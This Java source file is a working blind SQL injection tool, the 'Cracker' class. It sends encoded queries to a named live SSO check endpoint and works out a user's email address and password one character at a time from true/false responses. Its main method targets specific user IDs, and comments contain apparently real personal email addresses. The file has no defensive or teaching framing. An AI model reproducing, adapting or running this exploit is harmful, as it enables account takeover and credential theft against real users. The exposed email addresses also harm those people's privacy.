package com.cycrypt;

import java.util.Date;
import java.util.LinkedList;
import java.util.Map;

import com.cycrypt.cfg.CryptConfig;
import com.cycrypt.cfg.EmailCryptConfig;
import com.cycrypt.cfg.PassCryptConfig;
import com.cycrypt.http.query.CYParamEncrypter;
import com.cycrypt.http.query.HttpRequester;
import com.cycrypt.http.query.IHttpRequester;
import com.cycrypt.log.Loger;

public class Cracker {
//{"status":1606,"result":"ebf0d17a25d34b64c047cd1728"}  wrong user_pw
//{"status":0,"result":"aeb28e2575c107209503"}
	
	
	private IHttpRequester requester = new HttpRequester();
	
	public void crackEmailAndPass(String cyId)
	{
		//Date start = new Date();
		String email = this.crackEmail(cyId);
		String pass = this.crackPass(cyId,email);
		//Loger.info("All complete "+email+" - "+pass+"      cost:"+(new Date().getTime()-start.getTime())/1000+"s");
	}
	
	public String crackEmail(String cyId)
	{
		EmailCryptConfig cfg = new EmailCryptConfig(cyId);
		String emailAddress = this.crack(cfg);
		return emailAddress;
	}
	
	public String crackPass(String cyId,String email)
	{
		PassCryptConfig cfg = new PassCryptConfig(cyId,email);
		String pass = this.crack(cfg);
		return pass;
	}
	
	
	public String crack(CryptConfig cfg)
	{
		Date start = new Date();
		Loger.debug("guessing len..");
		int contentLen = this.guessLenght(cfg);
		Loger.debug("content len is "+contentLen);
		Loger.debug("guessing sugguestLetterDic..");
		LinkedList<String> sugguestDic = this.guessSugguestLetterDic(cfg, contentLen);
		Loger.debug("SugguestLetterDic complet..");
		Loger.debug("guessing content..");
		String content = this.guessContent(cfg, contentLen, sugguestDic);
		Loger.debug("guessing content complete:"+content+"      cost:"+(new Date().getTime()-start.getTime())/1000+"s");
		return content;
	}
	
	private int guessLenght(CryptConfig cfg)
	{
		
		for(int i=1,maxContentLen = cfg.getMaxContetLen();i<maxContentLen;i++)
		{
			String param = cfg.getContentLenQuery(i);
			if(requestAndTest(param))
				return i;
		}
		return -1;
	}
	
	private LinkedList<String> guessSugguestLetterDic(CryptConfig cfg,int contentLen)
	{
		String[] baseDic = DicMaker.BASE_LETTER_DIC;
		int baseDicLen = baseDic.length;
		LinkedList<String> result = new LinkedList<String>();
		int foundCount = 0;
		for(int i=0;i<baseDicLen;i++)
		{
			if(contentLen>0&&foundCount==contentLen)
				break;
			String l = baseDic[i];
			String param = cfg.getContentInstrQuery(baseDic[i]);
			if(this.requestAndTest(param))
			{
				result.offer(l);
				foundCount++;
			}
		}
		return result;
	}
	
	private String guessContent(CryptConfig cfg,int contentLen,LinkedList<String> sugguestDic)
	{
		if(contentLen<1)
			return null;
		StringBuffer result = new StringBuffer(contentLen);
		int dicLen =  sugguestDic.size();
		for(int i=0;i<contentLen;i++)
		{
			for(int j=0;j<dicLen;)
			{
				String l = sugguestDic.get(j);
				if(l==null)
				{
					result.append("[?]");
					break;
				}
				String param = cfg.getContentIndexQuery(l, i, contentLen);
				if(this.requestAndTest(param))
				{
					result.append(l.replace("\\_", "_"));
					sugguestDic.remove(j);
					sugguestDic.offer(l);
					break;
				}
				j++;
			}
		}
		return result.toString();
	}
	
	private boolean requestAndTest(String param)
	{
		param =  CYParamEncrypter.encode(param);
		String url = "http://cyworld.ifensi.com/services/sso/check_user.php?param="+param;
		String requestResult = requester.stringResultForURL(url);
		return this.isSQLTrue(requestResult);
	}
	
	private boolean isSQLTrue(String requestResult)
	{
		return requestResult.contains("\"status\":0");
	}
	
	
	
	public static void main(String[] args)
	{
		Cracker cracker = new Cracker();
		//EmailCryptConfig cfg = new EmailCryptConfig("2001729706");//2001000000
		/*EmailCryptConfig cfg = new EmailCryptConfig("2001000000");//2001000000
		String emailAddress = cr.crack(cfg);
		System.out.println(emailAddress);*/
		cracker.crackEmailAndPass("2005546866");
		//cracker.crackPass("2007337464", "axhley0713@hotmail.com");
		//cracker.crackEmailAndPass("2001729706");
		//cracker.crackPass("2001729706","goldwins520@gmail.com");
	}
	
	
	
	
}
